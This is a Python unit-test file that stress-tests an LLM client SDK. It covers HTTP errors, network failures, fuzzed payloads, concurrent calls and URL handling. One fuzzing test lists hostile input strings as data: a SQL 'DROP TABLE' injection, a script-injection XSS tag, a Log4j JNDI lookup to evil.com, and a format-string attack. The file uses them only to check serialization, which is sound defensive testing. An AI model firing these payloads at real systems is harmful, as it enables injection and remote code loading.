import json
import random
import string
import threading
import time
import unittest
from concurrent.futures import ThreadPoolExecutor, as_completed
from unittest.mock import MagicMock, patch

from pydantic import ValidationError
import requests

import vectros_sdk
from vectros_sdk import (
    AIOSKernelError,
    LLMQuery,
    LLMResponse,
    Query,
    Response,
    llm_call_tool,
    llm_chat,
    llm_chat_with_json_output,
    llm_chat_with_tool_call_output,
    llm_operate_file,
    send_request,
)
from vectros_sdk.client.config import aios_kernel_url, get_kernel_url, set_kernel_url


class TestNetworkChaosAndHostileResponses(unittest.TestCase):
    """Brutal test suite: Network faults, HTTP anomalies, and corrupted kernel responses."""

    @patch("requests.post")
    def test_http_status_codes_gamut(self, mock_post):
        """Test how the SDK handles every evil HTTP status code from 400 to 599."""
        evil_statuses = [400, 401, 403, 404, 405, 408, 413, 422, 429, 500, 502, 503, 504, 520, 599]
        for status in evil_statuses:
            mock_resp = MagicMock()
            mock_resp.ok = False
            mock_resp.status_code = status
            mock_resp.text = f"Simulated evil error {status}"
            mock_resp.json.side_effect = json.JSONDecodeError("Expecting value", "", 0)
            mock_post.return_value = mock_resp

            with self.assertRaises(AIOSKernelError) as ctx:
                llm_chat("chaos_agent", [{"role": "user", "content": "hello"}])
            self.assertEqual(ctx.exception.status_code, status)
            self.assertIn(str(status), str(ctx.exception))

    @patch("requests.post")
    def test_malformed_non_json_kernel_responses(self, mock_post):
        """Kernel returns 200 OK but body is HTML (e.g. Nginx crash, cloudflare page), garbage, or empty string."""
        garbage_payloads = [
            "<html><body>502 Bad Gateway Nginx/1.18.0</body></html>",
            "<!DOCTYPE html>",
            "JSON-RPC-ERROR-TRUNCATED-{{{",
            "",
            "   ",
            "\x00\x01\x02\x03\xff\xfe",
            "{'invalid_json_single_quotes': True}",
        ]
        for garbage in garbage_payloads:
            mock_resp = MagicMock()
            mock_resp.ok = True
            mock_resp.status_code = 200
            mock_resp.text = garbage
            mock_resp.json.side_effect = json.JSONDecodeError("Expecting value", "", 0)
            mock_post.return_value = mock_resp

            with self.assertRaises(AIOSKernelError) as ctx:
                llm_chat("chaos_agent", [{"role": "user", "content": "ping"}])
            self.assertIn("Failed to parse JSON response", str(ctx.exception))

    @patch("requests.post")
    def test_simulated_network_disasters(self, mock_post):
        """Simulate connection reset, DNS failure, SSL handshake abort, pipe errors."""
        disasters = [
            requests.exceptions.ConnectionError("Connection reset by peer [Errno 104]"),
            requests.exceptions.ConnectTimeout("HTTPSConnectionPool: Connect timed out (endpoint down)"),
            requests.exceptions.ReadTimeout("Read timed out after 60 seconds"),
            requests.exceptions.SSLError("SSL: CERTIFICATE_VERIFY_FAILED"),
            requests.exceptions.ChunkedEncodingError("Connection broken: IncompleteRead"),
            requests.exceptions.ProxyError("Cannot connect to proxy"),
        ]
        for disaster in disasters:
            mock_post.side_effect = disaster
            with self.assertRaises(AIOSKernelError):
                llm_chat("agent", [{"role": "user", "content": "test"}])


class TestPayloadFuzzingAndExtremeBoundaries(unittest.TestCase):
    """Brutal test suite: Monster payloads, unicode torture, recursion, schema depth."""

    def test_massive_payload_serialization(self):
        """Generate a 10MB message payload with 50,000 characters per message across 50 messages."""
        huge_text = "".join(random.choices(string.ascii_letters + string.digits, k=50_000))
        messages = [{"role": "user" if i % 2 == 0 else "assistant", "content": f"{huge_text}_{i}"} for i in range(50)]

        q = LLMQuery(
            agent_name="beast_bot",
            messages=messages,
            action_type="chat",
        )
        dumped = q.model_dump()
        self.assertEqual(len(dumped["messages"]), 50)
        self.assertTrue(len(dumped["messages"][0]["content"]) >= 50_000)

    def test_unicode_and_hostile_characters_fuzzing(self):
        """Test emoji avalanches, zero-width joiners, bidirectional overrides, null bytes, format strings."""
        hostile_strings = [
            "🔥" * 1000,
            "\u200B\u200C\u200D\uFEFF" * 500,  # Zero-width spaces
            "\u202E" + "reversed_text" + "\u202C",  # BiDi RTL override
            "SELECT * FROM agents; DROP TABLE memories; --",  # SQL injection syntax
            "<script>alert('XSS')</script>",  # Script injection
            "${jndi:ldap://evil.com/a}",  # Log4j format injection
            "%s%d%n%x%p" * 50,  # Format string attack
            "日本語 / 한국어 / Русский / العربية / עברית / 𓀀𓀁𓀂",  # Multi-script unicode
            "\x00\x01\x08\x0b\x0c\x0e\x1f",  # Control characters
        ]
        for hostile in hostile_strings:
            q = LLMQuery(
                agent_name=f"agent_{hostile[:10]}",
                messages=[{"role": "user", "content": hostile, "name": hostile[:20]}],
                action_type="chat",
            )
            data = q.model_dump()
            self.assertEqual(data["messages"][0]["content"], hostile)
            serialized = json.dumps(data)
            self.assertIsInstance(serialized, str)

    def test_deeply_nested_json_schema_fuzzing(self):
        """50-levels deep nested JSON schema in response_format."""
        schema = {"type": "string"}
        for i in range(50):
            schema = {
                "type": "object",
                "properties": {
                    f"level_{i}": schema
                },
                "required": [f"level_{i}"]
            }

        q = LLMQuery(
            agent_name="schema_torture",
            messages=[{"role": "user", "content": "Extract"}],
            response_format={"type": "json_object", "schema": schema},
        )
        self.assertIsNotNone(q.response_format)
        dumped = json.dumps(q.model_dump())
        self.assertIn("level_49", dumped)

    def test_tool_calls_malformed_and_edge_case_inputs(self):
        """Corrupted, empty, or polymorphic tool_calls inputs."""
        # 1. Corrupted JSON string in tool_calls (fallback keeps raw string without crash)
        resp1 = LLMResponse(tool_calls="NOT_A_JSON_{[")
        self.assertEqual(resp1.tool_calls, "NOT_A_JSON_{[")

        # 2. Empty list, None, string list, nested dicts
        resp2 = LLMResponse(tool_calls=[])
        self.assertEqual(resp2.tool_calls, [])

        resp3 = LLMResponse(tool_calls=None)
        self.assertIsNone(resp3.tool_calls)

        # 3. 1000 tool calls in a single response
        huge_tool_calls = [{"name": f"tool_{i}", "parameters": {"arg": i}} for i in range(1000)]
        resp4 = LLMResponse(tool_calls=json.dumps(huge_tool_calls))
        self.assertEqual(len(resp4.tool_calls), 1000)
        self.assertEqual(resp4.tool_calls[999]["name"], "tool_999")


class TestConcurrentHammeringAndThreadSafety(unittest.TestCase):
    """Brutal test suite: 100 parallel threads hammering API and mutating runtime configs."""

    @patch("vectros_sdk.llm.api.send_request")
    def test_concurrent_api_hammering_with_mock(self, mock_send_request):
        """100 threads concurrently making LLM API calls with random latency and payloads."""
        mock_send_request.side_effect = lambda query, base_url=None: {
            "response": {
                "response_class": "llm",
                "response_message": f"Worker response for {query.agent_name}",
                "finished": True,
                "status_code": 200,
            }
        }

        thread_count = 100
        results = []
        errors = []

        def worker(worker_id: int):
            time.sleep(random.uniform(0.0005, 0.005))
            res = llm_chat(
                f"agent_{worker_id}",
                messages=[{"role": "user", "content": f"query from worker {worker_id}"}]
            )
            return res.response_message

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(worker, i) for i in range(thread_count)]
            for future in as_completed(futures):
                try:
                    results.append(future.result())
                except Exception as e:
                    errors.append(e)

        self.assertEqual(len(errors), 0, f"Encountered thread errors: {errors}")
        self.assertEqual(len(results), thread_count)

    def test_thread_safe_url_mutations(self):
        """Simulate concurrent threads calling set_kernel_url() and get_kernel_url()."""
        num_threads = 50

        def mutate_url(i: int):
            url = f"http://kernel-{i}.internal:8000"
            set_kernel_url(url)
            current = get_kernel_url()
            self.assertTrue(current.startswith("http://kernel-") or current.startswith("http://localhost"))

        threads = [threading.Thread(target=mutate_url, args=(i,)) for i in range(num_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # Reset back
        set_kernel_url("http://localhost:8000")


class TestHostileURLAndSubscriptingAttacks(unittest.TestCase):
    """Brutal test suite: URL path mutilation and infinite recursion subscripting."""

    @patch("requests.post")
    def test_url_path_formatting_torture(self, mock_post):
        """Mutilated URLs with trailing slashes, duplicate slashes, IP addresses, port variations."""
        test_urls = [
            ("http://localhost:8000", "http://localhost:8000/query"),
            ("http://localhost:8000/", "http://localhost:8000/query"),
            ("http://localhost:8000///", "http://localhost:8000/query"),
            ("http://127.0.0.1:9999/query", "http://127.0.0.1:9999/query"),
            ("http://[::1]:8080", "http://[::1]:8080/query"),
            ("https://aios.remote-server.io:443/custom/query", "https://aios.remote-server.io:443/custom/query"),
        ]

        mock_resp = MagicMock()
        mock_resp.ok = True
        mock_resp.json.return_value = {"status": "ok"}
        mock_post.return_value = mock_resp

        for input_url, expected_endpoint in test_urls:
            mock_post.reset_mock()
            send_request({"query_class": "test"}, base_url=input_url)
            mock_post.assert_called_once()
            called_url = mock_post.call_args[0][0]
            self.assertEqual(called_url, expected_endpoint)

    def test_infinite_response_subscripting_invariance(self):
        """response['response']['response']['response'] must remain stable without exploding stack."""
        resp = LLMResponse(response_message="inception", finished=True)
        curr = resp
        for _ in range(20):
            curr = curr["response"]
        self.assertEqual(curr.response_message, "inception")
        self.assertEqual(curr["response_message"], "inception")

    def test_subscripting_keyerror_on_invalid_keys(self):
        """Accessing invalid keys must raise KeyError, but get() returns default."""
        resp = LLMResponse(response_message="test")
        with self.assertRaises(KeyError):
            _ = resp["totally_fake_field_1234"]

        self.assertIsNone(resp.get("totally_fake_field_1234"))
        self.assertEqual(resp.get("totally_fake_field_1234", "fallback_val"), "fallback_val")


if __name__ == "__main__":
    unittest.main()
